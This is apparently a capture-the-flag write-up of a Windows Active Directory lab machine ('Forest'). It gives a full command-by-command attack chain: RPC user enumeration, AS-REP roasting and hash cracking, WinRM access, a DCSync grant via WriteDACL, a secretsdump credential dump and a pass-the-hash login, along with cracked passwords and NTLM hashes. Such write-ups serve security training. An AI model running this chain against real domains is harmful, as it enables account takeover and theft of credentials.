## 2026-07-17
---

Difficulty: Easy

#### Information Gathering - User Enumeration via RPC

**Vulnerability Explanation:** The RPC Information can be accessed without credentials. This allowed the enumeration of the users in the system.

**Vulnerability Fix:** The RPC Server should be configured with credentials and disable the guest enumeration.

**Steps to reproduce the attack:** In order to enumerate the users throughout RPC, we first have to enumerate the services from the vulnerable system and then attempt to interact with the RPC Server.

# User Flag
### Service Enumeration

We will first enumerate the services using NMAP.
```
sudo nmap 10.129.45.228 -sC -sV -oA nmap/forest
```

Here is the output of the results.
```
Nmap scan report for 10.129.45.228
Host is up (0.035s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-12-25 14:18:34Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-25T14:18:37
|_  start_date: 2025-12-25T14:16:26
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-12-25T06:18:40-08:00
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 25 09:11:57 2025 -- 1 IP address (1 host up) scanned in 21.34 seconds
```

**Ports Open:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3269, 5985.

We can see how there are many services that are available, including TCP Port 135 - RPC.

We will now add the `htb.local` into our `/etc/hosts` file.
```
10.129.45.228      htb.local
```

Then, we will now proceed to enumerate the RPC Server.
```
rpcclient -U '%' htb.local
```

After a successful connection, we will now attempt to enumerate the users.
```
rpcclient $> enumdomusers
```

And the user list is now visible.
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

We have extracted the username part of the list in order to make a user list to enumerate further.
```
cat users.txt| cut -d '[' -f2 | cut -d ']' -f1 > new_users.txt
```

#### Initial Access - svc-alfresco user vulnerable to AS-REP Roasting

We will now proceed to enumerate the users associated with Kerberos.
```
impacket-GetNPUsers 'htb.local/' -dc-ip 10.129.45.228 -usersfile users.txt -format hashcat
```

However, we discover that one user, `svc-alfresco` does not have NTLM pre-authentication enabled, revealing his password hash to unprivileged users.

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2c1ba306c77838e159c34dbc2af356aa$1aabe28c997c08227b0fe0ccce8f1518006837ce0626e39c675fa073747a4328dfb46ee8e60acfd4c1c055b45293a8a6303797237ccbfdea5b07bf9d6e3656cfadba003e9a38a8d9aae1f98fc7341d3166046852ba0a37e0d3efa7f31438437b1c8be9c83bf3345b8dcc481bf985e273cb5b4529cca38b64b6ed92ec28162994eeead382c31ccab45281dca9391945f602653b5ea0600ab5d8a518dad201f29cc087b95d8b5d6fab846219156d5de1ac212a6a5412ae6e1c43b23cf84e209813b5cc4eb35b5a91d74502796afdcc8353bfa76336f5fef57d3fe6a2616c09a06aa503a8d4d162
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We will now crack this hash through hashcat.
```
hashcat -m 18200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

We have successfully cracked the hash. 
The Password is `s3rvice`.

We will check if this user can remote access through WinRM.
```
netexec winrm htb.local -u 'svc-alfresco' -p 's3rvice'
```

```bash
SMB         htb.local       5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        htb.local       5985   FOREST           [*] http://htb.local:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       htb.local       5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

We managed to validate the credentials successfully.

We will now connect via WinRM.
```
evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
```

We have successfully obtained the user flag.
![](<Screenshot 2026-07-17 at 20.41.52.png>)


# Root Flag

#### Privilege Escalation - GenericAll and WriteDACL Exploitation

We will now proceed to enumerate the user through Bloodhound.
```
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.45.225 -d htb.local -c All --zip
```

After uploading though Bloodhound, here is the controls from the `svc-alfresco` user on the Active Directory Domain.

Since the scope is too large, we will attempt to find the shortest path to Administrator, through Bloodhound Pathfinding Settings, from `svc-alfresco` to `administrator`.

![](<Screenshot 2026-07-17 at 22.10.50.png>)

Now the exploitation feels more straightforward.

Bloodhound revealed that `svc-alfresco` has the `GenericWrite` privileges over the `Exchange Windows Permissions` group. This group possesses `WriteDACL` over the domain, allowing us to grant the DCSync Privileges.

We will first have to exploit the GenericWrite Privileges by creating a new user, `john` through the user `svc-alfresco` to the `Exchange Windows Permissions` which is a group that can interact with the Domain Controller.

```
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

After the user was successfully created and assigned to the group, we will now proceed to the second step of exploiting `WriteDACL` to gain DCSync Access from the user.
```
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'john' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'john':'abc123!'
```

After successful confirmation of the exploit, run the command in order to exploit the DCSync and gain the respective hashes.
```
impacket-secretsdump htb.local/john:'abc123!'@htb.local
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
```

We successfully gained the `Administrator` user's hash.

We can now login to the system by the Pass-The-Hash method with `psexec`.
```
impacket-psexec administrator@htb.local -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
```

After gaining a successful connection, we have now obtained our root flag.

![](<Screenshot 2026-07-17 at 22.09.24.png>)